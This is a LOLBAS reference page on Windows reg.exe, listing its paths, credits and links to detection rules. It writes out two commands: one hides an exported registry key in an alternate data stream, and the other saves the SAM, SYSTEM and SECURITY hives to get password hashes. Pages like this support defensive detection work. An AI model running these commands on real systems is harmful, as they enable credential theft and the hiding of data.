---
title: "Reg.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Reg/
fetched_at: 2026-09-20T17:11:13Z
license: unspecified
category: windows
---

Used to manipulate the registry

## Paths
- C:\Windows\System32\reg.exe
- C:\Windows\SysWOW64\reg.exe

## Resources
- [https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)
- [https://pure.security/dumping-windows-credentials/](https://pure.security/dumping-windows-credentials/)

## Acknowledgements
- Oddvar Moe ([@oddvarmoe](https://twitter.com/@oddvarmoe))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_regedit_import_keys_ads.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_regedit_import_keys_ads.yml)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regedit_import_keys.yml](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regedit_import_keys.yml)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_reg_dumping_sensitive_hives.yml](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_reg_dumping_sensitive_hives.yml)
- Splunk: [https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/attempted_credential_dump_from_registry_via_reg_exe.yml](https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/attempted_credential_dump_from_registry_via_reg_exe.yml)
- Elastic: [https://github.com/elastic/detection-rules/blob/f6421d8c534f295518a2c945f530e8afc4c8ad1b/rules/windows/credential_access_dump_registry_hives.toml](https://github.com/elastic/detection-rules/blob/f6421d8c534f295518a2c945f530e8afc4c8ad1b/rules/windows/credential_access_dump_registry_hives.toml)
- IOC: reg.exe writing to an ADS

## Alternate data streams

1. Export the target Registry key and save it to the specified .REG file within an Alternate data stream.

```
reg export HKLM\SOFTWARE\Microsoft\Evilreg {PATH_ABSOLUTE}:evilreg.reg
```

   - Use case: Hide/plant registry information in Alternate data stream for later use

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1564.004

2. Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material

```
reg save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak}
```

   - Use case: Dump credentials from the Security Account Manager (SAM)

   - Privileges required: Administrator

   - Operating systems: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1003.002
